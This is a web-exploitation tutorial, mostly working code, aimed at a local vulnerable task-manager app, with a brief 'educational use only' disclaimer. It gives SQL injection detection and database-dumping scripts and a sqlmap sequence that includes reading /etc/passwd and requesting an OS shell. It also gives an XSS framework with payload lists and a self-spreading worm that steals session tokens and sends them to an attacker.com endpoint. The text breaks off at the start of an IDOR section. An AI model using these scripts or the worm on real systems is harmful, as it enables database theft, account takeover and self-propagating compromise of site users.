# Comprehensive Vulnerability Exploitation Tutorials

## Overview

This document provides detailed, step-by-step tutorials for exploiting web application vulnerabilities in controlled educational environments. These tutorials are designed for security professionals, penetration testers, and developers to understand attack methodologies and improve defensive strategies.

**⚠️ IMPORTANT DISCLAIMER**: These tutorials are for educational purposes only and should only be used in authorized testing environments. Unauthorized access to computer systems is illegal and unethical.

## Prerequisites

### Required Tools and Setup

```bash
# Essential penetration testing tools
sudo apt update && sudo apt install -y \
    curl \
    wget \
    jq \
    python3 \
    python3-pip \
    nodejs \
    npm \
    burpsuite \
    sqlmap \
    nikto \
    nmap \
    gobuster

# Python libraries for exploitation scripts
pip3 install requests beautifulsoup4 selenium

# Browser automation for XSS testing
npm install -g puppeteer

# Set up testing environment variables
export TARGET_URL="http://localhost:3000"
export BURP_PROXY="http://127.0.0.1:8080"
```

### Testing Environment Setup

```bash
# Clone and setup vulnerable application
git clone https://github.com/your-org/vulnerable-task-manager
cd vulnerable-task-manager

# Start the application stack
docker-compose up -d

# Verify application is running
curl -s $TARGET_URL/health | jq .

# Create test accounts for multi-user testing
curl -X POST $TARGET_URL/api/auth/register \
     -H "Content-Type: application/json" \
     -d '{"email":"attacker@test.com","password":"password123","firstName":"Test","lastName":"Attacker"}'

curl -X POST $TARGET_URL/api/auth/register \
     -H "Content-Type: application/json" \
     -d '{"email":"victim@test.com","password":"password123","firstName":"Test","lastName":"Victim"}'
```

## Tutorial 1: SQL Injection Exploitation

### Phase 1: Discovery and Reconnaissance

#### Step 1.1: Identify Injection Points

```bash
#!/bin/bash
# SQL Injection Discovery Script

TARGET_URL="http://localhost:3000"
ENDPOINTS=(
    "/api/tasks/search?query="
    "/api/users/search?name="
    "/api/comments/search?content="
)

echo "=== SQL Injection Discovery ==="

for endpoint in "${ENDPOINTS[@]}"; do
    echo "Testing endpoint: $endpoint"
    
    # Test basic injection characters
    for payload in "'" '"' ";" "--" "/*"; do
        response=$(curl -s -w "%{http_code}" -o /tmp/sqli_test.html \
                       "${TARGET_URL}${endpoint}${payload}")
        
        if [ "$response" = "500" ]; then
            echo "  ✓ Potential SQL injection at: $endpoint with payload: $payload"
            echo "  Response saved to /tmp/sqli_test.html"
        fi
    done
done
```

#### Step 1.2: Confirm SQL Injection Vulnerability

```python
#!/usr/bin/env python3
"""
SQL Injection Confirmation Script
Tests for different types of SQL injection vulnerabilities
"""

import requests
import time
import sys

class SQLInjectionTester:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.session = requests.Session()
        if auth_token:
            self.session.headers.update({'Authorization': f'Bearer {auth_token}'})
    
    def test_error_based_injection(self, endpoint, parameter):
        """Test for error-based SQL injection"""
        print(f"\n[+] Testing error-based injection on {endpoint}")
        
        error_payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "' AND '1'='2",
            "' UNION SELECT 1--",
            "'; SELECT 1--"
        ]
        
        for payload in error_payloads:
            try:
                params = {parameter: payload}
                response = self.session.get(f"{self.base_url}{endpoint}", params=params)
                
                # Check for SQL error indicators
                error_indicators = [
                    'syntax error',
                    'mysql_fetch',
                    'postgresql',
                    'ora-',
                    'microsoft jet database',
                    'sqlite_',
                    'sqlstate'
                ]
                
                response_text = response.text.lower()
                for indicator in error_indicators:
                    if indicator in response_text:
                        print(f"  ✓ SQL Error detected with payload: {payload}")
                        print(f"    Error indicator: {indicator}")
                        return True
                        
            except Exception as e:
                print(f"  ✗ Error testing payload {payload}: {e}")
        
        return False
    
    def test_boolean_based_injection(self, endpoint, parameter):
        """Test for boolean-based blind SQL injection"""
        print(f"\n[+] Testing boolean-based injection on {endpoint}")
        
        # Baseline request
        baseline_response = self.session.get(f"{self.base_url}{endpoint}", 
                                           params={parameter: "test"})
        baseline_length = len(baseline_response.text)
        
        # True condition test
        true_payload = "test' OR '1'='1"
        true_response = self.session.get(f"{self.base_url}{endpoint}", 
                                       params={parameter: true_payload})
        
        # False condition test
        false_payload = "test' AND '1'='2"
        false_response = self.session.get(f"{self.base_url}{endpoint}", 
                                        params={parameter: false_payload})
        
        # Compare response lengths
        if len(true_response.text) != len(false_response.text):
            print(f"  ✓ Boolean-based injection detected")
            print(f"    True condition length: {len(true_response.text)}")
            print(f"    False condition length: {len(false_response.text)}")
            return True
        
        return False
    
    def test_time_based_injection(self, endpoint, parameter):
        """Test for time-based blind SQL injection"""
        print(f"\n[+] Testing time-based injection on {endpoint}")
        
        # Baseline timing
        start_time = time.time()
        self.session.get(f"{self.base_url}{endpoint}", params={parameter: "test"})
        baseline_time = time.time() - start_time
        
        # Time delay payloads (PostgreSQL)
        delay_payloads = [
            "test'; SELECT pg_sleep(5)--",
            "test' AND (SELECT pg_sleep(5))--",
            "test' OR (SELECT pg_sleep(5) WHERE '1'='1')--"
        ]
        
        for payload in delay_payloads:
            start_time = time.time()
            try:
                self.session.get(f"{self.base_url}{endpoint}", 
                               params={parameter: payload}, timeout=10)
                response_time = time.time() - start_time
                
                if response_time > (baseline_time + 4):  # 4+ second delay
                    print(f"  ✓ Time-based injection detected with payload: {payload}")
                    print(f"    Response time: {response_time:.2f} seconds")
                    return True
                    
            except requests.exceptions.Timeout:
                print(f"  ✓ Time-based injection detected (timeout) with payload: {payload}")
                return True
            except Exception as e:
                print(f"  ✗ Error testing payload {payload}: {e}")
        
        return False
    
    def test_union_based_injection(self, endpoint, parameter):
        """Test for UNION-based SQL injection"""
        print(f"\n[+] Testing UNION-based injection on {endpoint}")
        
        # Determine number of columns
        for col_count in range(1, 10):
            union_payload = f"test' UNION SELECT {','.join(['1'] * col_count)}--"
            
            try:
                response = self.session.get(f"{self.base_url}{endpoint}", 
                                          params={parameter: union_payload})
                
                # Check if UNION was successful (no error and different content)
                if response.status_code == 200 and "1" in response.text:
                    print(f"  ✓ UNION injection successful with {col_count} columns")
                    
                    # Test data extraction
                    extract_payload = f"test' UNION SELECT table_name,column_name,{','.join(['1'] * (col_count-2))} FROM information_schema.columns--"
                    extract_response = self.session.get(f"{self.base_url}{endpoint}", 
                                                      params={parameter: extract_payload})
                    
                    if "users" in extract_response.text.lower():
                        print(f"  ✓ Data extraction successful - found 'users' table")
                        return True
                        
            except Exception as e:
                continue
        
        return False

# Authentication helper
def get_auth_token(base_url, email, password):
    """Get authentication token for testing"""
    login_data = {"email": email, "password": password}
    response = requests.post(f"{base_url}/api/auth/login", json=login_data)
    
    if response.status_code == 200:
        return response.json().get('token')
    return None

# Main execution
if __name__ == "__main__":
    BASE_URL = "http://localhost:3000"
    
    # Get authentication token
    token = get_auth_token(BASE_URL, "attacker@test.com", "password123")
    if not token:
        print("Failed to authenticate. Exiting.")
        sys.exit(1)
    
    # Initialize tester
    tester = SQLInjectionTester(BASE_URL, token)
    
    # Test endpoints
    test_endpoints = [
        ("/api/tasks/search", "query"),
        ("/api/users/search", "name"),
        ("/api/comments/search", "content")
    ]
    
    print("=== SQL Injection Vulnerability Assessment ===")
    
    for endpoint, param in test_endpoints:
        print(f"\n{'='*50}")
        print(f"Testing endpoint: {endpoint}")
        print(f"Parameter: {param}")
        
        # Run all injection tests
        error_based = tester.test_error_based_injection(endpoint, param)
        boolean_based = tester.test_boolean_based_injection(endpoint, param)
        time_based = tester.test_time_based_injection(endpoint, param)
        union_based = tester.test_union_based_injection(endpoint, param)
        
        if any([error_based, boolean_based, time_based, union_based]):
            print(f"\n  🚨 VULNERABLE ENDPOINT FOUND: {endpoint}")
        else:
            print(f"\n  ✅ No SQL injection detected on {endpoint}")
```

### Phase 2: Data Extraction and Enumeration

#### Step 2.1: Database Enumeration

```python
#!/usr/bin/env python3
"""
SQL Injection Data Extraction Framework
Systematically extracts database information
"""

import requests
import json
import time
from urllib.parse import quote

class SQLDataExtractor:
    def __init__(self, base_url, auth_token, vulnerable_endpoint, parameter):
        self.base_url = base_url
        self.endpoint = vulnerable_endpoint
        self.parameter = parameter
        self.session = requests.Session()
        self.session.headers.update({'Authorization': f'Bearer {auth_token}'})
        
    def extract_database_version(self):
        """Extract database version information"""
        print("\n[+] Extracting database version...")
        
        version_payloads = [
            "test' UNION SELECT version(),1,1,1--",
            "test' UNION SELECT @@version,1,1,1--",
            "test' UNION SELECT sqlite_version(),1,1,1--"
        ]
        
        for payload in version_payloads:
            try:
                response = self.session.get(
                    f"{self.base_url}{self.endpoint}",
                    params={self.parameter: payload}
                )
                
                if response.status_code == 200:
                    # Look for version information in response
                    response_text = response.text.lower()
                    if any(db in response_text for db in ['postgresql', 'mysql', 'sqlite']):
                        print(f"  ✓ Database version extracted: {payload}")
                        return response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
                        
            except Exception as e:
                continue
        
        return None
    
    def extract_database_names(self):
        """Extract database names"""
        print("\n[+] Extracting database names...")
        
        # PostgreSQL database enumeration
        db_payload = "test' UNION SELECT datname,1,1,1 FROM pg_database--"
        
        try:
            response = self.session.get(
                f"{self.base_url}{self.endpoint}",
                params={self.parameter: db_payload}
            )
            
            if response.status_code == 200:
                print(f"  ✓ Database names extracted")
                return response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
                
        except Exception as e:
            print(f"  ✗ Error extracting database names: {e}")
        
        return None
    
    def extract_table_names(self):
        """Extract table names from current database"""
        print("\n[+] Extracting table names...")
        
        table_payloads = [
            "test' UNION SELECT table_name,1,1,1 FROM information_schema.tables WHERE table_schema='public'--",
            "test' UNION SELECT name,1,1,1 FROM sqlite_master WHERE type='table'--"
        ]
        
        for payload in table_payloads:
            try:
                response = self.session.get(
                    f"{self.base_url}{self.endpoint}",
                    params={self.parameter: payload}
                )
                
                if response.status_code == 200:
                    print(f"  ✓ Table names extracted with payload: {payload}")
                    return response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
                    
            except Exception as e:
                continue
        
        return None
    
    def extract_column_names(self, table_name):
        """Extract column names for a specific table"""
        print(f"\n[+] Extracting column names for table: {table_name}")
        
        column_payload = f"test' UNION SELECT column_name,data_type,1,1 FROM information_schema.columns WHERE table_name='{table_name}'--"
        
        try:
            response = self.session.get(
                f"{self.base_url}{self.endpoint}",
                params={self.parameter: column_payload}
            )
            
            if response.status_code == 200:
                print(f"  ✓ Column names extracted for {table_name}")
                return response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
                
        except Exception as e:
            print(f"  ✗ Error extracting columns for {table_name}: {e}")
        
        return None
    
    def extract_table_data(self, table_name, columns, limit=10):
        """Extract data from a specific table"""
        print(f"\n[+] Extracting data from table: {table_name}")
        
        # Construct column list (limit to first few columns to avoid errors)
        column_list = ','.join(columns[:4]) if len(columns) > 4 else ','.join(columns)
        
        # Add padding columns if needed
        while column_list.count(',') < 3:
            column_list += ",1"
        
        data_payload = f"test' UNION SELECT {column_list} FROM {table_name} LIMIT {limit}--"
        
        try:
            response = self.session.get(
                f"{self.base_url}{self.endpoint}",
                params={self.parameter: data_payload}
            )
            
            if response.status_code == 200:
                print(f"  ✓ Data extracted from {table_name}")
                return response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
                
        except Exception as e:
            print(f"  ✗ Error extracting data from {table_name}: {e}")
        
        return None
    
    def blind_data_extraction(self, query, max_length=100):
        """Extract data using blind SQL injection techniques"""
        print(f"\n[+] Blind extraction: {query}")
        
        result = ""
        
        for position in range(1, max_length + 1):
            found_char = False
            
            # Test printable ASCII characters (32-126)
            for char_code in range(32, 127):
                test_payload = f"test' AND ASCII(SUBSTRING(({query}),{position},1))={char_code}--"
                
                try:
                    response = self.session.get(
                        f"{self.base_url}{self.endpoint}",
                        params={self.parameter: test_payload}
                    )
                    
                    # Check if condition is true (application-specific logic)
                    if response.status_code == 200 and len(response.text) > 100:  # Adjust based on app behavior
                        result += chr(char_code)
                        print(f"  Position {position}: {chr(char_code)} (Result: {result})")
                        found_char = True
                        break
                        
                except Exception as e:
                    continue
            
            if not found_char:
                break
        
        return result
    
    def comprehensive_extraction(self):
        """Perform comprehensive data extraction"""
        print("=== Comprehensive SQL Injection Data Extraction ===")
        
        extraction_results = {}
        
        # Step 1: Database version
        version = self.extract_database_version()
        extraction_results['version'] = version
        
        # Step 2: Database names
        databases = self.extract_database_names()
        extraction_results['databases'] = databases
        
        # Step 3: Table names
        tables = self.extract_table_names()
        extraction_results['tables'] = tables
        
        # Step 4: Extract sensitive tables
        sensitive_tables = ['users', 'tasks', 'comments', 'admin', 'passwords']
        
        for table in sensitive_tables:
            print(f"\n--- Processing table: {table} ---")
            
            # Get column information
            columns = self.extract_column_names(table)
            extraction_results[f'{table}_columns'] = columns
            
            # Extract data if columns found
            if columns:
                # Parse column names from response (application-specific)
                column_names = ['id', 'email', 'password_hash', 'created_at']  # Example
                data = self.extract_table_data(table, column_names)
                extraction_results[f'{table}_data'] = data
        
        # Step 5: Blind extraction for specific sensitive data
        sensitive_queries = [
            "SELECT COUNT(*) FROM users",
            "SELECT email FROM users WHERE id=1",
            "SELECT password_hash FROM users WHERE id=1"
        ]
        
        for query in sensitive_queries:
            result = self.blind_data_extraction(query)
            extraction_results[f'blind_{query.replace(" ", "_")}'] = result
        
        return extraction_results

# Usage example
if __name__ == "__main__":
    BASE_URL = "http://localhost:3000"
    
    # Get authentication token
    def get_auth_token(base_url, email, password):
        login_data = {"email": email, "password": password}
        response = requests.post(f"{base_url}/api/auth/login", json=login_data)
        return response.json().get('token') if response.status_code == 200 else None
    
    token = get_auth_token(BASE_URL, "attacker@test.com", "password123")
    
    if token:
        # Initialize extractor for vulnerable endpoint
        extractor = SQLDataExtractor(
            BASE_URL, 
            token, 
            "/api/tasks/search", 
            "query"
        )
        
        # Perform comprehensive extraction
        results = extractor.comprehensive_extraction()
        
        # Save results
        with open('sql_injection_results.json', 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        print(f"\n=== Extraction Complete ===")
        print(f"Results saved to sql_injection_results.json")
    else:
        print("Authentication failed")
```

#### Step 2.2: Automated SQLMap Integration

```bash
#!/bin/bash
# Professional SQLMap Testing Suite

echo "=== SQLMap Professional Testing Suite ==="

# Configuration
TARGET_URL="http://localhost:3000/api/tasks/search?query=test"
TOKEN="your_jwt_token_here"
COOKIE="token=$TOKEN"
OUTPUT_DIR="./sqlmap_results"

# Create output directory
mkdir -p $OUTPUT_DIR

# Test 1: Basic vulnerability detection
echo "[1] Basic vulnerability detection..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       --batch \
       --level=3 \
       --risk=3 \
       --random-agent \
       --output-dir="$OUTPUT_DIR" \
       --flush-session

# Test 2: Database enumeration
echo "[2] Database enumeration..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       --dbs \
       --batch \
       --output-dir="$OUTPUT_DIR"

# Test 3: Current database and user
echo "[3] Current database and user information..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       --current-db \
       --current-user \
       --batch \
       --output-dir="$OUTPUT_DIR"

# Test 4: Table enumeration
echo "[4] Table enumeration..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       -D taskmanager \
       --tables \
       --batch \
       --output-dir="$OUTPUT_DIR"

# Test 5: Column enumeration for sensitive tables
echo "[5] Column enumeration for users table..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       -D taskmanager \
       -T users \
       --columns \
       --batch \
       --output-dir="$OUTPUT_DIR"

# Test 6: Data extraction from users table
echo "[6] Data extraction from users table..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       -D taskmanager \
       -T users \
       -C id,email,password_hash,first_name,last_name \
       --dump \
       --batch \
       --output-dir="$OUTPUT_DIR"

# Test 7: Search for passwords
echo "[7] Searching for password hashes..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       --passwords \
       --batch \
       --output-dir="$OUTPUT_DIR"

# Test 8: File system access (if possible)
echo "[8] Testing file system access..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       --file-read="/etc/passwd" \
       --batch \
       --output-dir="$OUTPUT_DIR"

# Test 9: OS shell access (advanced)
echo "[9] Testing OS shell access..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       --os-shell \
       --batch \
       --output-dir="$OUTPUT_DIR"

# Test 10: SQL shell access
echo "[10] Testing SQL shell access..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       --sql-shell \
       --batch \
       --output-dir="$OUTPUT_DIR"

echo "=== SQLMap Testing Complete ==="
echo "Results saved in: $OUTPUT_DIR"

# Generate summary report
echo "=== Generating Summary Report ==="
cat > "$OUTPUT_DIR/summary_report.md" << EOF
# SQLMap Testing Summary Report

## Test Configuration
- Target URL: $TARGET_URL
- Authentication: Cookie-based
- Test Date: $(date)

## Vulnerability Assessment
$(find $OUTPUT_DIR -name "*.log" -exec grep -l "vulnerable" {} \; | wc -l) vulnerable parameters found

## Database Information
$(find $OUTPUT_DIR -name "*.csv" -o -name "*.txt" | head -10)

## Extracted Data
$(find $OUTPUT_DIR -name "*.dump" | wc -l) data dumps created

## Recommendations
1. Implement parameterized queries
2. Add input validation
3. Use least privilege database accounts
4. Enable database query logging
5. Implement Web Application Firewall

EOF

echo "Summary report created: $OUTPUT_DIR/summary_report.md"
```

## Tutorial 2: Cross-Site Scripting (XSS) Exploitation

### Phase 1: XSS Discovery and Classification

#### Step 2.1: Automated XSS Discovery

```python
#!/usr/bin/env python3
"""
Comprehensive XSS Discovery and Exploitation Framework
"""

import requests
import json
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import base64

class XSSExploitationFramework:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.session = requests.Session()
        if auth_token:
            self.session.headers.update({'Authorization': f'Bearer {auth_token}'})
        
        # Setup Selenium WebDriver
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        self.driver = webdriver.Chrome(options=chrome_options)
        
        # XSS payloads for testing
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "'-alert('XSS')-'",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
        ]
    
    def discover_xss_endpoints(self):
        """Discover potential XSS injection points"""
        print("\n[+] Discovering XSS injection points...")
        
        # Common endpoints that might be vulnerable
        test_endpoints = [
            {'url': '/api/comments/task/1', 'method': 'POST', 'param': 'content'},
            {'url': '/api/tasks', 'method': 'POST', 'param': 'title'},
            {'url': '/api/tasks', 'method': 'POST', 'param': 'description'},
            {'url': '/api/users/profile', 'method': 'PUT', 'param': 'firstName'},
            {'url': '/api/users/profile', 'method': 'PUT', 'param': 'lastName'},
            {'url': '/api/users/profile', 'method': 'PUT', 'param': 'bio'},
            {'url': '/api/tasks/search', 'method': 'GET', 'param': 'query'}
        ]
        
        vulnerable_endpoints = []
        
        for endpoint in test_endpoints:
            print(f"  Testing {endpoint['method']} {endpoint['url']} - {endpoint['param']}")
            
            for payload in self.xss_payloads[:5]:  # Test first 5 payloads
                try:
                    if endpoint['method'] == 'GET':
                        response = self.session.get(
                            f"{self.base_url}{endpoint['url']}",
                            params={endpoint['param']: payload}
                        )
                    else:
                        data = {endpoint['param']: payload}
                        response = self.session.request(
                            endpoint['method'],
                            f"{self.base_url}{endpoint['url']}",
                            json=data
                        )
                    
                    # Check if payload is reflected in response
                    if payload in response.text and response.status_code in [200, 201]:
                        vulnerable_endpoints.append({
                            'endpoint': endpoint,
                            'payload': payload,
                            'response_snippet': response.text[:200]
                        })
                        print(f"    ✓ Potential XSS found with payload: {payload}")
                        break
                        
                except Exception as e:
                    print(f"    ✗ Error testing {payload}: {e}")
        
        return vulnerable_endpoints
    
    def test_stored_xss(self, endpoint_info):
        """Test for stored XSS vulnerabilities"""
        print(f"\n[+] Testing stored XSS on {endpoint_info['endpoint']['url']}")
        
        # Advanced XSS payloads for stored XSS
        stored_payloads = [
            "<script>document.body.innerHTML='<h1>Stored XSS Executed</h1>'</script>",
            "<img src=x onerror=\"fetch('/api/steal', {method:'POST', body:localStorage.getItem('token')})\">",
            "<svg onload=\"eval(atob('YWxlcnQoJ1N0b3JlZCBYU1MnKQ=='))\">", # Base64 encoded alert
            "<iframe src=\"javascript:void(0)\" onload=\"this.contentDocument.write('<script>alert(\\'Stored XSS\\')</script>')\">",
            "<script>setInterval(function(){fetch('/api/monitor', {method:'POST', body:JSON.stringify({token:localStorage.token, url:location.href})})}, 30000)</script>"
        ]
        
        results = []
        
        for payload in stored_payloads:
            try:
                # Submit XSS payload
                if endpoint_info['endpoint']['method'] == 'POST':
                    data = {endpoint_info['endpoint']['param']: payload}
                    response = self.session.post(
                        f"{self.base_url}{endpoint_info['endpoint']['url']}",
                        json=data
                    )
                    
                    if response.status_code in [200, 201]:
                        # Wait for storage
                        time.sleep(2)
                        
                        # Try to trigger stored XSS by visiting the page
                        trigger_success = self.trigger_stored_xss(endpoint_info['endpoint']['url'], payload)
                        
                        if trigger_success:
                            results.append({
                                'payload': payload,
                                'stored': True,
                                'triggered': True
                            })
                            print(f"    ✓ Stored XSS confirmed with payload: {payload}")
                        
            except Exception as e:
                print(f"    ✗ Error testing stored XSS: {e}")
        
        return results
    
    def trigger_stored_xss(self, endpoint_url, payload):
        """Trigger stored XSS using Selenium"""
        try:
            # Navigate to page that displays stored content
            if 'comments' in endpoint_url:
                page_url = f"{self.base_url}/tasks/1"  # Task detail page
            elif 'tasks' in endpoint_url:
                page_url = f"{self.base_url}/dashboard"  # Dashboard page
            else:
                page_url = f"{self.base_url}/profile"  # Profile page
            
            self.driver.get(page_url)
            
            # Wait for page load and check for alert
            try:
                WebDriverWait(self.driver, 5).until(EC.alert_is_present())
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                alert.accept()
                
                if 'XSS' in alert_text or 'Stored' in alert_text:
                    return True
                    
            except:
                # Check for DOM manipulation
                page_source = self.driver.page_source
                if any(indicator in page_source for indicator in ['<h1>Stored XSS', 'XSS Executed', payload]):
                    return True
            
            return False
            
        except Exception as e:
            print(f"    Error triggering XSS: {e}")
            return False
    
    def test_reflected_xss(self, endpoint_info):
        """Test for reflected XSS vulnerabilities"""
        print(f"\n[+] Testing reflected XSS on {endpoint_info['endpoint']['url']}")
        
        reflected_payloads = [
            "<script>alert('Reflected XSS')</script>",
            "<img src=x onerror=alert(document.domain)>",
            "<svg onload=alert(document.cookie)>",
            "javascript:alert('Reflected')",
            "<iframe src=javascript:alert('Reflected')>",
            "<body onload=alert('Reflected')>",
            "<input onfocus=alert('Reflected') autofocus>",
            "<details open ontoggle=alert('Reflected')>",
            "'-alert('Reflected')-'",
            "\";alert('Reflected');//"
        ]
        
        results = []
        
        for payload in reflected_payloads:
            try:
                if endpoint_info['endpoint']['method'] == 'GET':
                    response = self.session.get(
                        f"{self.base_url}{endpoint_info['endpoint']['url']}",
                        params={endpoint_info['endpoint']['param']: payload}
                    )
                else:
                    data = {endpoint_info['endpoint']['param']: payload}
                    response = self.session.request(
                        endpoint_info['endpoint']['method'],
                        f"{self.base_url}{endpoint_info['endpoint']['url']}",
                        json=data
                    )
                
                # Check if payload is reflected without encoding
                if payload in response.text and response.status_code == 200:
                    results.append({
                        'payload': payload,
                        'reflected': True,
                        'response_length': len(response.text)
                    })
                    print(f"    ✓ Reflected XSS found with payload: {payload}")
                    
            except Exception as e:
                print(f"    ✗ Error testing reflected XSS: {e}")
        
        return results
    
    def test_dom_xss(self):
        """Test for DOM-based XSS vulnerabilities"""
        print("\n[+] Testing DOM-based XSS...")
        
        # DOM XSS test URLs with fragments
        dom_test_urls = [
            f"{self.base_url}/#<script>alert('DOM XSS')</script>",
            f"{self.base_url}/search#<img src=x onerror=alert('DOM')>",
            f"{self.base_url}/profile#<svg onload=alert('DOM')>",
            f"{self.base_url}/tasks#javascript:alert('DOM')"
        ]
        
        results = []
        
        for test_url in dom_test_urls:
            try:
                self.driver.get(test_url)
                time.sleep(2)
                
                # Check for alert
                try:
                    WebDriverWait(self.driver, 3).until(EC.alert_is_present())
                    alert = self.driver.switch_to.alert
                    alert_text = alert.text
                    alert.accept()
                    
                    if 'DOM' in alert_text:
                        results.append({
                            'url': test_url,
                            'dom_xss': True,
                            'alert_text': alert_text
                        })
                        print(f"    ✓ DOM XSS found at: {test_url}")
                        
                except:
                    pass
                    
            except Exception as e:
                print(f"    ✗ Error testing DOM XSS: {e}")
        
        return results
    
    def create_xss_worm(self, target_endpoint):
        """Create self-propagating XSS worm"""
        print("\n[+] Creating XSS worm payload...")
        
        worm_payload = """
        <script>
        (function() {
            // Worm configuration
            const WORM_ID = 'xss_worm_v1';
            const API_BASE = window.location.origin + '/api';
            
            // Prevent re-infection
            if (window[WORM_ID]) return;
            window[WORM_ID] = true;
            
            // Steal authentication token
            const token = localStorage.getItem('token') || 
                         sessionStorage.getItem('token') ||
                         document.cookie.match(/token=([^;]+)/)?.[1];
            
            if (!token) return;
            
            // Exfiltrate user data
            fetch(API_BASE + '/users/profile', {
                headers: { 'Authorization': 'Bearer ' + token }
            })
            .then(r => r.json())
            .then(userData => {
                // Send stolen data to attacker server
                fetch('https://attacker.com/collect', {
                    method: 'POST',
                    body: JSON.stringify({
                        type: 'user_data',
                        token: token,
                        data: userData,
                        url: window.location.href,
                        timestamp: Date.now()
                    })
                }).catch(() => {});
            });
            
            // Propagate worm to other users
            setTimeout(() => {
                // Get user's tasks to find collaboration opportunities
                fetch(API_BASE + '/tasks', {
                    headers: { 'Authorization': 'Bearer ' + token }
                })
                .then(r => r.json())
                .then(tasks => {
                    tasks.slice(0, 3).forEach(task => {
                        // Inject worm into task comments
                        const wormComment = `
                            <div style="display:none">
                                <script>(${arguments.callee.toString()})();</script>
                            </div>
                            <p>Great work on this task! 👍</p>
                        `;
                        
                        fetch(API_BASE + '/comments/task/' + task.id, {
                            method: 'POST',
                            headers: {
                                'Authorization': 'Bearer ' + token,
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ content: wormComment })
                        }).catch(() => {});
                    });
                });
            }, 5000);
            
        })();
        </script>
        """
        
        return worm_payload.strip()
    
    def comprehensive_xss_test(self):
        """Perform comprehensive XSS testing"""
        print("=== Comprehensive XSS Vulnerability Assessment ===")
        
        results = {
            'discovery': [],
            'stored_xss': [],
            'reflected_xss': [],
            'dom_xss': [],
            'worm_payloads': []
        }
        
        # Step 1: Discover XSS endpoints
        vulnerable_endpoints = self.discover_xss_endpoints()
        results['discovery'] = vulnerable_endpoints
        
        # Step 2: Test each vulnerable endpoint
        for endpoint_info in vulnerable_endpoints:
            # Test stored XSS
            stored_results = self.test_stored_xss(endpoint_info)
            results['stored_xss'].extend(stored_results)
            
            # Test reflected XSS
            reflected_results = self.test_reflected_xss(endpoint_info)
            results['reflected_xss'].extend(reflected_results)
        
        # Step 3: Test DOM XSS
        dom_results = self.test_dom_xss()
        results['dom_xss'] = dom_results
        
        # Step 4: Create worm payloads for confirmed vulnerabilities
        if results['stored_xss']:
            for endpoint_info in vulnerable_endpoints:
                if any(r['stored'] for r in results['stored_xss']):
                    worm = self.create_xss_worm(endpoint_info['endpoint'])
                    results['worm_payloads'].append({
                        'endpoint': endpoint_info['endpoint'],
                        'payload': worm
                    })
        
        return results
    
    def cleanup(self):
        """Cleanup resources"""
        if self.driver:
            self.driver.quit()

# Usage example
if __name__ == "__main__":
    BASE_URL = "http://localhost:3000"
    
    # Get authentication token
    def get_auth_token(base_url, email, password):
        login_data = {"email": email, "password": password}
        response = requests.post(f"{base_url}/api/auth/login", json=login_data)
        return response.json().get('token') if response.status_code == 200 else None
    
    token = get_auth_token(BASE_URL, "attacker@test.com", "password123")
    
    if token:
        # Initialize XSS framework
        xss_framework = XSSExploitationFramework(BASE_URL, token)
        
        try:
            # Perform comprehensive XSS testing
            results = xss_framework.comprehensive_xss_test()
            
            # Save results
            with open('xss_exploitation_results.json', 'w') as f:
                json.dump(results, f, indent=2, default=str)
            
            print(f"\n=== XSS Testing Complete ===")
            print(f"Discovered endpoints: {len(results['discovery'])}")
            print(f"Stored XSS vulnerabilities: {len(results['stored_xss'])}")
            print(f"Reflected XSS vulnerabilities: {len(results['reflected_xss'])}")
            print(f"DOM XSS vulnerabilities: {len(results['dom_xss'])}")
            print(f"Worm payloads created: {len(results['worm_payloads'])}")
            print(f"Results saved to xss_exploitation_results.json")
            
        finally:
            xss_framework.cleanup()
    else:
        print("Authentication failed")
```

## Tutorial 3: IDOR Exploitation Framework

### Phase 1: IDOR Discovery and Enumeration

```python
#!/usr/bin/env python3
"""
Comprehensive IDOR Exploitation Framework
"""

import requests
import threading
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import random

class IDORExploitationFramework:
    def __init__(self, base_url, auth_tokens):
        self.base_url = base_url
        self.auth_tokens = auth_tokens  # Dictionary of user tokens
        self.session = requests.Session()
        
    def discover_idor_endpoints(self):
        """Discover potential IDOR vulnerable endpoints"""
        print("\n[+] Discovering IDOR vulnerable endpoints...")
        
        # Common IDOR-prone endpoints
        test_endpoints = [
